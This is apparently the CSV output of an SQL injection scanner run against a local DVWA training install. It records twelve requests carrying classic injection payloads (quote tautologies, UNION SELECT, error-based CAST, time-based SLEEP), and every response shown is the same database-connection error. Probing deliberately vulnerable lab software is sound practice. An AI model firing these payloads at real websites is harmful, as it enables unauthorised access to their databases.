url,method,param,payload,status,resp_len,resp_time,sql_error_flag,baseline_len,len_diff,seq_ratio,payload_type,baseline_snippet,resp_snippet
http://localhost/DVWA/vulnerabilities/sqli/?id=1,GET,id,' OR '1'='1,200,634,2.5202107429504395,1,634,0,1.0,quote,<br /> <b>fatal error</b>:  uncaught mysqli_sql_exception: no connection could be made because the target machine actively refused it in c:\users\siddh\onedrive\desktop\intern\htdocs\dvwa\dvwa\includes\dvwapage.inc.php:570 stack trace: #0 c:\users\siddh\onedrive\desktop\intern\htdocs\dvwa\dvwa\inclu,<br /> <b>fatal error</b>:  uncaught mysqli_sql_exception: no connection could be made because the target machine actively refused it in c:\users\siddh\onedrive\desktop\intern\htdocs\dvwa\dvwa\includes\dvwapage.inc.php:570 stack trace: #0 c:\users\siddh\onedrive\desktop\intern\htdocs\dvwa\dvwa\inclu
http://localhost/DVWA/vulnerabilities/sqli/?id=1,GET,id,' OR '1'='1' --,200,634,2.060983896255493,1,634,0,1.0,comment,<br /> <b>fatal error</b>:  uncaught mysqli_sql_exception: no connection could be made because the target machine actively refused it in c:\users\siddh\onedrive\desktop\intern\htdocs\dvwa\dvwa\includes\dvwapage.inc.php:570 stack trace: #0 c:\users\siddh\onedrive\desktop\intern\htdocs\dvwa\dvwa\inclu,<br /> <b>fatal error</b>:  uncaught mysqli_sql_exception: no connection could be made because the target machine actively refused it in c:\users\siddh\onedrive\desktop\intern\htdocs\dvwa\dvwa\includes\dvwapage.inc.php:570 stack trace: #0 c:\users\siddh\onedrive\desktop\intern\htdocs\dvwa\dvwa\inclu
http://localhost/DVWA/vulnerabilities/sqli/?id=1,GET,id,' UNION SELECT NULL --,200,634,2.064152479171753,1,634,0,1.0,union,<br /> <b>fatal error</b>:  uncaught mysqli_sql_exception: no connection could be made because the target machine actively refused it in c:\users\siddh\onedrive\desktop\intern\htdocs\dvwa\dvwa\includes\dvwapage.inc.php:570 stack trace: #0 c:\users\siddh\onedrive\desktop\intern\htdocs\dvwa\dvwa\inclu,<br /> <b>fatal error</b>:  uncaught mysqli_sql_exception: no connection could be made because the target machine actively refused it in c:\users\siddh\onedrive\desktop\intern\htdocs\dvwa\dvwa\includes\dvwapage.inc.php:570 stack trace: #0 c:\users\siddh\onedrive\desktop\intern\htdocs\dvwa\dvwa\inclu
http://localhost/DVWA/vulnerabilities/sqli/?id=1,GET,id,' AND 1=CAST((SELECT TOP 1 name FROM users) AS INT) --,200,634,2.0805819034576416,1,634,0,1.0,comment,<br /> <b>fatal error</b>:  uncaught mysqli_sql_exception: no connection could be made because the target machine actively refused it in c:\users\siddh\onedrive\desktop\intern\htdocs\dvwa\dvwa\includes\dvwapage.inc.php:570 stack trace: #0 c:\users\siddh\onedrive\desktop\intern\htdocs\dvwa\dvwa\inclu,<br /> <b>fatal error</b>:  uncaught mysqli_sql_exception: no connection could be made because the target machine actively refused it in c:\users\siddh\onedrive\desktop\intern\htdocs\dvwa\dvwa\includes\dvwapage.inc.php:570 stack trace: #0 c:\users\siddh\onedrive\desktop\intern\htdocs\dvwa\dvwa\inclu
http://localhost/DVWA/vulnerabilities/sqli/?id=1,GET,id,' AND SLEEP(3) --,200,634,2.0481860637664795,1,634,0,1.0,time,<br /> <b>fatal error</b>:  uncaught mysqli_sql_exception: no connection could be made because the target machine actively refused it in c:\users\siddh\onedrive\desktop\intern\htdocs\dvwa\dvwa\includes\dvwapage.inc.php:570 stack trace: #0 c:\users\siddh\onedrive\desktop\intern\htdocs\dvwa\dvwa\inclu,<br /> <b>fatal error</b>:  uncaught mysqli_sql_exception: no connection could be made because the target machine actively refused it in c:\users\siddh\onedrive\desktop\intern\htdocs\dvwa\dvwa\includes\dvwapage.inc.php:570 stack trace: #0 c:\users\siddh\onedrive\desktop\intern\htdocs\dvwa\dvwa\inclu
http://localhost/DVWA/vulnerabilities/sqli/?id=1,GET,id,""" OR ""a""=""a",200,634,2.080976963043213,1,634,0,1.0,quote,<br /> <b>fatal error</b>:  uncaught mysqli_sql_exception: no connection could be made because the target machine actively refused it in c:\users\siddh\onedrive\desktop\intern\htdocs\dvwa\dvwa\includes\dvwapage.inc.php:570 stack trace: #0 c:\users\siddh\onedrive\desktop\intern\htdocs\dvwa\dvwa\inclu,<br /> <b>fatal error</b>:  uncaught mysqli_sql_exception: no connection could be made because the target machine actively refused it in c:\users\siddh\onedrive\desktop\intern\htdocs\dvwa\dvwa\includes\dvwapage.inc.php:570 stack trace: #0 c:\users\siddh\onedrive\desktop\intern\htdocs\dvwa\dvwa\inclu
http://localhost/DVWA/vulnerabilities/sqli/?id=1,POST,submit,' OR '1'='1,200,634,2.042381525039673,1,634,0,1.0,quote,<br /> <b>fatal error</b>:  uncaught mysqli_sql_exception: no connection could be made because the target machine actively refused it in c:\users\siddh\onedrive\desktop\intern\htdocs\dvwa\dvwa\includes\dvwapage.inc.php:570 stack trace: #0 c:\users\siddh\onedrive\desktop\intern\htdocs\dvwa\dvwa\inclu,<br /> <b>fatal error</b>:  uncaught mysqli_sql_exception: no connection could be made because the target machine actively refused it in c:\users\siddh\onedrive\desktop\intern\htdocs\dvwa\dvwa\includes\dvwapage.inc.php:570 stack trace: #0 c:\users\siddh\onedrive\desktop\intern\htdocs\dvwa\dvwa\inclu
http://localhost/DVWA/vulnerabilities/sqli/?id=1,POST,submit,' OR '1'='1' --,200,634,2.092062473297119,1,634,0,1.0,comment,<br /> <b>fatal error</b>:  uncaught mysqli_sql_exception: no connection could be made because the target machine actively refused it in c:\users\siddh\onedrive\desktop\intern\htdocs\dvwa\dvwa\includes\dvwapage.inc.php:570 stack trace: #0 c:\users\siddh\onedrive\desktop\intern\htdocs\dvwa\dvwa\inclu,<br /> <b>fatal error</b>:  uncaught mysqli_sql_exception: no connection could be made because the target machine actively refused it in c:\users\siddh\onedrive\desktop\intern\htdocs\dvwa\dvwa\includes\dvwapage.inc.php:570 stack trace: #0 c:\users\siddh\onedrive\desktop\intern\htdocs\dvwa\dvwa\inclu
http://localhost/DVWA/vulnerabilities/sqli/?id=1,POST,submit,' UNION SELECT NULL --,200,634,2.057163953781128,1,634,0,1.0,union,<br /> <b>fatal error</b>:  uncaught mysqli_sql_exception: no connection could be made because the target machine actively refused it in c:\users\siddh\onedrive\desktop\intern\htdocs\dvwa\dvwa\includes\dvwapage.inc.php:570 stack trace: #0 c:\users\siddh\onedrive\desktop\intern\htdocs\dvwa\dvwa\inclu,<br /> <b>fatal error</b>:  uncaught mysqli_sql_exception: no connection could be made because the target machine actively refused it in c:\users\siddh\onedrive\desktop\intern\htdocs\dvwa\dvwa\includes\dvwapage.inc.php:570 stack trace: #0 c:\users\siddh\onedrive\desktop\intern\htdocs\dvwa\dvwa\inclu
http://localhost/DVWA/vulnerabilities/sqli/?id=1,POST,submit,' AND 1=CAST((SELECT TOP 1 name FROM users) AS INT) --,200,634,2.0664258003234863,1,634,0,1.0,comment,<br /> <b>fatal error</b>:  uncaught mysqli_sql_exception: no connection could be made because the target machine actively refused it in c:\users\siddh\onedrive\desktop\intern\htdocs\dvwa\dvwa\includes\dvwapage.inc.php:570 stack trace: #0 c:\users\siddh\onedrive\desktop\intern\htdocs\dvwa\dvwa\inclu,<br /> <b>fatal error</b>:  uncaught mysqli_sql_exception: no connection could be made because the target machine actively refused it in c:\users\siddh\onedrive\desktop\intern\htdocs\dvwa\dvwa\includes\dvwapage.inc.php:570 stack trace: #0 c:\users\siddh\onedrive\desktop\intern\htdocs\dvwa\dvwa\inclu
http://localhost/DVWA/vulnerabilities/sqli/?id=1,POST,submit,' AND SLEEP(3) --,200,634,2.0795068740844727,1,634,0,1.0,time,<br /> <b>fatal error</b>:  uncaught mysqli_sql_exception: no connection could be made because the target machine actively refused it in c:\users\siddh\onedrive\desktop\intern\htdocs\dvwa\dvwa\includes\dvwapage.inc.php:570 stack trace: #0 c:\users\siddh\onedrive\desktop\intern\htdocs\dvwa\dvwa\inclu,<br /> <b>fatal error</b>:  uncaught mysqli_sql_exception: no connection could be made because the target machine actively refused it in c:\users\siddh\onedrive\desktop\intern\htdocs\dvwa\dvwa\includes\dvwapage.inc.php:570 stack trace: #0 c:\users\siddh\onedrive\desktop\intern\htdocs\dvwa\dvwa\inclu
http://localhost/DVWA/vulnerabilities/sqli/?id=1,POST,submit,""" OR ""a""=""a",200,634,2.083325862884521,1,634,0,1.0,quote,<br /> <b>fatal error</b>:  uncaught mysqli_sql_exception: no connection could be made because the target machine actively refused it in c:\users\siddh\onedrive\desktop\intern\htdocs\dvwa\dvwa\includes\dvwapage.inc.php:570 stack trace: #0 c:\users\siddh\onedrive\desktop\intern\htdocs\dvwa\dvwa\inclu,<br /> <b>fatal error</b>:  uncaught mysqli_sql_exception: no connection could be made because the target machine actively refused it in c:\users\siddh\onedrive\desktop\intern\htdocs\dvwa\dvwa\includes\dvwapage.inc.php:570 stack trace: #0 c:\users\siddh\onedrive\desktop\intern\htdocs\dvwa\dvwa\inclu
